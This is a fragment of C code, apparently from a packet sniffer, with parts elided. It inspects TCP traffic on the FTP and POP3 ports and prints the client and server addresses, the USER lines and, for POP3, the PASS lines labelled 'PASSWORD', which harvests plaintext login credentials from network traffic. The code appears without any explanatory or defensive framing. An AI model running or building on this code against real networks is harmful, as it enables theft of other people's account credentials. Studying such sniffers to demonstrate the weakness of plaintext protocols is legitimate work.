	...
	if (data_len > 0) {
		if (ntohs(tcp->source) == 21 || ntohs(tcp->dest) == 21) {
			if (strncmp(data, "USER", 4) == 0) {
				printf("[FTP]");
				tmp.s_addr=ip->saddr;
				printf("[SADDR:%s] ", inet_ntoa(tmp));
				tmp.s_addr=ip->daddr;
				printf("[FTP Server:%s] ", inet_ntoa(tmp));
				printf("\n%s", data);
			}
		...
		if (ntohs(tcp->source) == 110 || ntohs(tcp->dest) == 110) {
			if (strncmp(data, "USER", 4) == 0) {
				...
				printf("[SADDR:%s] ", inet_ntoa(tmp));
				tmp.s_addr=ip->daddr;
				printf("[Email Server:%s] ", inet_ntoa(tmp));
				printf("\n%s\n", data);
			}
			if (strncmp(data, "PASS", 4) == 0) {
				printf("PASSWORD :%s\n", data);
